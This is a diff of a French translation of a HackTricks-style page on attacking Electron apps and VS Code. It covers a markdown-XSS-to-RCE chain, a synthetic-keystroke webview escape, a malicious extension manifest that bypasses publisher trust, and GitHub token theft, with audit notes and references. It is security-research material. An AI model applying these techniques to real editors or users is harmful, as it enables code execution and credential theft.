 Cette chaîne d’exploitation réelle touchait Visual Studio Code 1.63 (CVE-2021-43908) et montre comment une simple XSS déclenchée par du markdown dans une webview peut être exploitée jusqu’à obtenir une RCE complète lorsque la CSP, postMessage et les gestionnaires de schéma sont mal configurés. PoC publique : https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>
 
-Vue d’ensemble de la chaîne d’exploitation
-- Première XSS via la CSP de webview : La CSP générée incluait `style-src 'self' 'unsafe-inline'`, ce qui permettait une injection basée sur les styles ou les styles inline dans un contexte `vscode-webview://`. Le payload envoyait un beacon à `/stealID` pour exfiltrer l’extensionId de la webview ciblée.
-- Construction de l’URL de la webview cible : Utilisation de l’ID divulgué pour construire `vscode-webview://<extensionId>/.../<publicUrl>`.
-- Deuxième XSS via la confiance dans postMessage : La webview externe faisait confiance à `window.postMessage` sans vérification stricte de l’origine ni du type et chargeait du HTML contrôlé par l’attaquant avec `allowScripts: true`.
-- Chargement de fichiers locaux via la réécriture du schéma et du chemin : Le payload réécrivait `file:///...` en `vscode-file://vscode-app/...` et remplaçait `exploit.md` par `RCE.html`, en exploitant une validation de chemin insuffisante pour charger une ressource locale privilégiée.
-- RCE dans un contexte où Node est activé : Le HTML chargé s’exécutait avec les API Node disponibles, permettant l’exécution de commandes sur le système d’exploitation.
+Vue d’ensemble de la chaîne d’attaque
+- Première XSS via la CSP de webview : la CSP générée incluait `style-src 'self' 'unsafe-inline'`, ce qui autorisait l’injection basée sur du code inline ou des styles dans un contexte `vscode-webview://`. Le payload envoyait une requête à `/stealID` pour exfiltrer l’extensionId de la webview cible.
+- Construction de l’URL de la webview cible : utilisation de l’ID leaké pour construire `vscode-webview://<extensionId>/.../<publicUrl>`.
+- Deuxième XSS via la confiance en postMessage : la webview externe faisait confiance à `window.postMessage` sans vérification stricte de l’origine ou du type et chargeait le HTML de l’attaquant avec `allowScripts: true`.
+- Chargement de fichiers locaux via la réécriture du schéma/chemin : le payload réécrivait `file:///...` en `vscode-file://vscode-app/...` et remplaçait `exploit.md` par `RCE.html`, exploitant une validation de chemin faible pour charger une ressource locale privilégiée.
+- RCE dans un contexte où Node est activé : le HTML chargé s’exécutait avec les API Node disponibles, permettant l’exécution de commandes du système d’exploitation.
 
 Exemple de primitive RCE dans le contexte final
 ```js
@@ -492,15 +494,15 @@ Lectures complémentaires sur les problèmes de confiance liés à postMessage :
 ../../pentesting-web/postmessage-vulnerabilities/README.md
 {{#endref}}
 
-## VS Code / github.dev : raccourcis synthétiques de webview + ponts de commandes déclaratifs d’extension
+## VS Code / github.dev : raccourcis webview synthétiques + ponts déclaratifs de commandes d’extension
 
-Une autre catégorie d’évasion de webview dans VS Code est apparue en juin 2026 : **du JavaScript non fiable dans une webview de notebook/aperçu pouvait simuler des raccourcis globaux privilégiés**, car le preload de la webview transmettait les données `keydown` au workbench hôte, qui les traitait comme de véritables entrées utilisateur.<sup>[[14]](#references)</sup>
+Une autre catégorie de contournement des webviews de VS Code est apparue en juin 2026 : **du JavaScript non fiable dans une webview de notebook/aperçu pouvait synthétiser des raccourcis globaux privilégiés**, car le preload de la webview transmettait les données `keydown` au workbench hôte, qui les traitait comme une véritable saisie utilisateur.<sup>[[14]](#references)</sup>
 
-Cela s’inscrit dans une longue histoire d’attaques contre les frontières de confiance des IDE, où du contenu contrôlé par un projet peut accéder à des fonctionnalités privilégiées de l’éditeur.<sup>[[19]](#references)</sup>
+Cela s’inscrit dans une longue histoire d’attaques contre les frontières de confiance des IDE, où du contenu contrôlé par le projet atteint des fonctionnalités privilégiées de l’éditeur.<sup>[[19]](#references)</sup>
 
-### Échec de la frontière
+### Défaillance de la frontière de confiance
 
-Si une webview cross-origin/sandboxée copie des champs de clavier contrôlés par un attaquant (`key`, `code`, `keyCode`, modificateurs, `repeat`) dans un pont privilégié `postMessage`/message-port **sans vérifier `event.isTrusted`**, le JavaScript exécuté dans la webview peut déclencher des raccourcis du workbench avec :<sup>[[14]](#references)[[15]](#references)</sup>
+Si une webview sandboxée/d’une origine différente copie des champs clavier contrôlés par l’attaquant (`key`, `code`, `keyCode`, modificateurs, `repeat`) dans un pont privilégié `postMessage`/port de messages **sans vérifier `event.isTrusted`**, le JavaScript exécuté dans la webview peut déclencher les raccourcis du workbench avec :<sup>[[14]](#references)[[15]](#references)</sup>
 
 ```javascript
 window.dispatchEvent(
@@ -514,13 +516,13 @@ window.dispatchEvent(
 )
 ```
 
-Ceci est particulièrement utile lorsque la **saisie synthétique est bloquée** par le navigateur. Les événements de touches scriptés ne peuvent généralement **pas saisir de texte arbitraire dans les éléments HTML `<input>`**, mais ils déclenchent tout de même les raccourcis qui traitent directement `keydown`.
+C’est particulièrement utile lorsque **la saisie synthétique est bloquée** par le navigateur. Les événements clavier scriptés ne peuvent généralement **pas saisir de texte arbitraire dans les éléments HTML `<input>`**, mais ils déclenchent toujours les raccourcis qui traitent directement `keydown`.
 
-### Schémas d’abus pratiques
+### Exemples pratiques d’abus
 
-- **Abus de l’interface par les raccourcis :** cibler des raccourcis globaux tels que l’acceptation de notifications, la navigation dans les palettes, l’activation des boutons sélectionnés ou le déplacement dans les menus, plutôt que d’essayer de saisir des commandes.
-- **Invites privilégiées prévisibles à partir des métadonnées de l’espace de travail :** un fichier `.vscode/extensions.json` contrôlé par le dépôt peut recommander une extension malveillante et générer une notification d’installation prévisible, qui peut être acceptée à l’aide d’un raccourci tel que `Ctrl+Shift+A`.
-- **Manifeste déclaratif d’extension comme pont de commande :** même si le code d’extension de l’espace de travail local est bloqué par la CSP dans VS Code web, les contributions déclaratives de `package.json` peuvent tout de même être chargées. Une extension locale dans `.vscode/extensions` peut enregistrer un raccourci clavier qui appelle `runCommands`, puis une commande interne privilégiée telle que `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>
+- **Abus de l’interface utilisateur via les raccourcis :** cibler les raccourcis globaux, tels que l’acceptation de notifications, la navigation dans une palette, l’activation du bouton sélectionné ou le déplacement dans un menu, plutôt que d’essayer de saisir des commandes.
+- **Invites privilégiées prévisibles à partir des métadonnées de l’espace de travail :** un fichier `.vscode/extensions.json` contrôlé par le dépôt peut recommander une extension malveillante et déclencher une notification d’installation prévisible, qui peut être acceptée avec un raccourci tel que `Ctrl+Shift+A`.
+- **Manifeste d’extension déclaratif servant de passerelle vers les commandes :** même si le CSP bloque le code d’une extension locale de l’espace de travail dans VS Code web, les contributions déclaratives de `package.json` peuvent tout de même être chargées. Une extension locale dans `.vscode/extensions` peut enregistrer un raccourci clavier qui appelle `runCommands`, puis une commande interne privilégiée telle que `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>
 
 Exemple de modèle de manifeste :
 
@@ -538,29 +540,29 @@ Exemple de modèle de manifeste :
 }
 ```
 
-- **Indicateurs de sécurité cachés accessibles via des métadonnées non fiables :** si la commande interne accepte des arguments contrôlés par un attaquant, comme `{"context":{"skipPublisherTrust":true}}`, les métadonnées déclaratives peuvent supprimer une boîte de dialogue de confiance et installer une extension hébergée sur le Marketplace/CDN qui finit par exécuter du code malveillant.
-- **Abus de la confiance accordée aux espaces de travail :** si les espaces de travail distants/web sont automatiquement considérés comme fiables, les extensions des espaces de travail locaux deviennent un pont de grande valeur entre le contenu d’un dépôt et les actions privilégiées de l’éditeur.
-- **Amplification de la portée après compromission :** après l’exécution de l’extension, examinez les tokens que l’éditeur expose aux extensions. Dans `github.dev`, le token GitHub volé était valide au-delà du dépôt ouvert ; la requête à `https://api.github.com/user/repos` a donc permis d’énumérer d’autres dépôts privés accessibles.
+- **Indicateurs de sécurité cachés accessibles via des métadonnées non fiables :** si la commande interne accepte des arguments contrôlés par un attaquant, tels que `{"context":{"skipPublisherTrust":true}}`, les métadonnées déclaratives peuvent supprimer une boîte de dialogue de confiance et installer une extension hébergée sur le Marketplace/CDN, qui finit par exécuter du code malveillant.
+- **Abus de la confiance accordée aux espaces de travail :** si les espaces de travail distants/web sont automatiquement considérés comme fiables, les extensions d’espaces de travail locaux deviennent un relais de grande valeur entre le contenu d’un dépôt et les actions privilégiées de l’éditeur.
+- **Amplification de la portée après compromission :** après l’exécution de l’extension, inspectez les jetons que l’éditeur expose aux extensions. Dans `github.dev`, le jeton GitHub volé était valide au-delà du dépôt ouvert ; une requête à `https://api.github.com/user/repos` permettait donc d’énumérer d’autres dépôts privés accessibles.
 
 ### Notes d’audit
 
-- Traitez le **transfert des entrées de la webview vers l’hôte** comme une frontière de privilèges ; ne redispatchez jamais vers l’hôte des événements synthétiques de clavier/clic provenant de cadres non fiables.
-- Appliquez l’autorisation **dans** les commandes sensibles. N’acceptez pas de contexte de commande fourni par l’appelant et permettant de définir des indicateurs internes comme `skipPublisherTrust`.
-- Ne partez pas du principe qu’empêcher l’exécution de code d’extension local suffit ; examinez aussi les **contributions déclaratives** (`keybindings`, `menus`, `commands`, tasks) des manifestes contrôlés par l’espace de travail.
-- Les correctifs du 3 juin 2026 ont ajouté `isTrusted` aux événements transférés, désactivé le transfert des frappes non fiables dans les webviews de notebook et cessé d’accepter le contexte d’installation fourni par l’appelant.<sup>[[16]](#references)[[17]](#references)</sup>
+- Traitez le **transfert des entrées des webviews vers l’hôte** comme une frontière de privilèges ; ne redistribuez jamais vers l’hôte des événements synthétiques de touche/clic provenant de frames non fiables.
+- Appliquez l’autorisation **dans les commandes sensibles**. N’acceptez pas de contexte de commande fourni par l’appelant qui peut définir des indicateurs internes tels que `skipPublisherTrust`.
+- Ne partez pas du principe que bloquer le code exécutable des extensions locales suffit ; examinez également les **contributions déclaratives** (`keybindings`, `menus`, `commands`, tasks) provenant de manifestes contrôlés par l’espace de travail.
+- Les correctifs du 3 juin 2026 ont ajouté `isTrusted` aux événements transférés, désactivé le transfert des touches non fiables dans les webviews de notebook et cessé d’accepter le contexte de commande d’installation fourni par l’appelant.<sup>[[16]](#references)[[17]](#references)</sup>
 
 ## **Outils**
 
-La collection sélectionnée **awesome-electronjs-hacking** propose d’autres ressources de recherche, outils et applications vulnérables.<sup>[[5]](#references)</sup>
+La collection sélectionnée **awesome-electronjs-hacking** propose des ressources supplémentaires de recherche, des outils et des applications vulnérables.<sup>[[5]](#references)</sup>
 
-- [**Electronegativity**](https://github.com/doyensec/electronegativity) est un outil qui détecte les mauvaises configurations et les anti-patterns de sécurité dans les applications basées sur Electron.
+- [**Electronegativity**](https://github.com/doyensec/electronegativity) est un outil qui détecte les erreurs de configuration et les anti-patterns de sécurité dans les applications basées sur Electron.
 - [**Electrolint**](https://github.com/ksdmitrieva/electrolint) est un plugin open source pour VS Code destiné aux applications Electron, qui utilise Electronegativity.
 - [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) vérifie la présence de bibliothèques tierces vulnérables.
 - [**Electro.ng**](https://electro.ng/) est un outil commercial d’analyse de sécurité pour Electron.
 
-## Ateliers
+## Labs
 
-Vous trouverez un lab pour exploiter des applications Electron vulnérables à l’adresse [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s).<sup>[[4]](#references)</sup>
+La vidéo [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) présente un lab pour exploiter des applications Electron vulnérables.<sup>[[4]](#references)</sup>
 
 Ces commandes vous aideront à réaliser le lab :
 
@@ -587,33 +589,33 @@ npm install
 npm start
 ```
 
-Adresse publiée précédemment pour les favoris existants : [Applications de bureau Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). La route de la page entière redirige ici ; le fragment historique n’est pas maintenu.
+Ancienne adresse publiée pour les favoris existants : [Applications de bureau Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). L’ancienne route de la page entière redirige ici ; l’ancre historique n’est pas maintenue.
 
 ## References
 
-- [1] [Phishing et collecte d’identifiants dans les applications Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
+- [1] [Hameçonnage et collecte d’identifiants dans les applications Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
 - [2] [Lecture arbitraire de fichiers dans l’application de bureau Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
-- [3] [Electron : exploitation de l’absence d’isolation du contexte - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
-- [4] [Atelier de piratage d’applications de bureau modernes avec XSS et RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
-- [5] [awesome-electronjs-hacking - liste sélectionnée de ressources sur la sécurité (et l’insécurité) d’Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
+- [3] [Electron : exploiter l’absence d’isolation du contexte - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
+- [4] [Atelier de hacking des applications de bureau modernes avec XSS et RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
+- [5] [awesome-electronjs-hacking - une sélection de ressources sur l’insécurité d’Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
 - [6] [Mauvaise utilisation des API Electron : le premier choix d’un attaquant](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
-- [7] [Payloads RCE pour nodeIntegration dans Electron](https://7as.es/electron/nodeIntegration_rce.txt)
+- [7] [Charges utiles RCE nodeIntegration d’Electron](https://7as.es/electron/nodeIntegration_rce.txt)
 - [8] [RCE en un clic dans les applications Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
-- [9] [Les dangers de shell.openExternal() dans Electron - de nombreuses voies vers l’exécution de code à distance](https://benjamin-altpeter.de/shell-openexternal-dangers/)
-- [10] [Autoriser les URL arbitraires, c’est s’attendre à une exécution de code arbitraire](https://positive.security/blog/url-open-rce#windows-10-19042)
-- [11] [Obtenir une RCE dans un célèbre outil de messagerie japonais grâce à une fonctionnalité Electron obsolète](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
+- [9] [Les dangers de shell.openExternal() d’Electron - de nombreux chemins vers l’exécution de code à distance](https://benjamin-altpeter.de/shell-openexternal-dangers/)
+- [10] [Autorisez les URL arbitraires, attendez-vous à une exécution de code arbitraire](https://positive.security/blog/url-open-rce#windows-10-19042)
+- [11] [Obtenir une RCE dans un célèbre outil de chat japonais grâce à une fonctionnalité Electron obsolète](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
 - [12] [Discord Desktop - Exécution de code à distance](https://blog.electrovolt.io/posts/discord-rce/)
 - [13] [Visual Studio Code - Exécution de code à distance en mode restreint (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
-- [14] [Vol de token GitHub en un clic via l’injection d’événements clavier dans VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
-- [15] [Problème VS Code #319593 : les Webviews peuvent déclencher des raccourcis clavier arbitraires dans l’espace de travail principal](https://github.com/microsoft/vscode/issues/319593)
-- [16] [PR VS Code #319705 : confirmer l’ouverture des notebooks et cesser d’accepter le contexte installExtension fourni par l’appelant](https://github.com/microsoft/vscode/pull/319705)
-- [17] [PR VS Code #319813 : bloquer la redistribution programmatique des événements de pression de touche et de clic dans les Webviews de notebooks](https://github.com/microsoft/vscode/pull/319813)
-- [18] [VS Code 1.89 / extensions d’espace de travail local](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
-- [19] [APPSEC Cali 2018 - MarkDoom : comment j’ai piraté tous les principaux IDE en deux semaines](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
-- [20] [ElectroVolt : pwning des applications de bureau populaires et découverte d’une nouvelle surface d’attaque sur Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
+- [14] [Vol de jeton GitHub en un clic via l’injection d’événements clavier dans VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
+- [15] [Problème VS Code n° 319593 : les Webview peuvent déclencher des raccourcis clavier arbitraires dans l’espace de travail principal](https://github.com/microsoft/vscode/issues/319593)
+- [16] [PR VS Code n° 319705 : confirmer l’ouverture des notebooks et cesser d’accepter le contexte installExtension fourni par l’appelant](https://github.com/microsoft/vscode/pull/319705)
+- [17] [PR VS Code n° 319813 : bloquer la redistribution programmatique des événements clavier/clic des Webview dans les Webview de notebook](https://github.com/microsoft/vscode/pull/319813)
+- [18] [VS Code 1.89 / extensions d’espace de travail locales](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
+- [19] [APPSEC Cali 2018 - MarkDoom : comment j’ai hacké tous les principaux IDE en 2 semaines](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
+- [20] [ElectroVolt : prendre le contrôle d’applications de bureau populaires tout en découvrant une nouvelle surface d’attaque dans Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
 - [21] [Sécurité d’Electron](https://www.electronjs.org/docs/latest/tutorial/security)
-- [22] [webPreferences de BrowserWindow dans Electron](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
-- [23] [REA : rétro-ingénierie de tout](https://github.com/morluto/rea)
+- [22] [webPreferences de BrowserWindow d’Electron](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
+- [23] [REA : rétroconcevoir n’importe quoi](https://github.com/morluto/rea)
 - [24] [Reconstruction d’artefacts JavaScript avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
-- [25] [Workflows d’applications JavaScript multicouches avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
+- [25] [Flux de travail d’applications JavaScript multicouches avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
 {{#include ../../banners/hacktricks-training.md}}
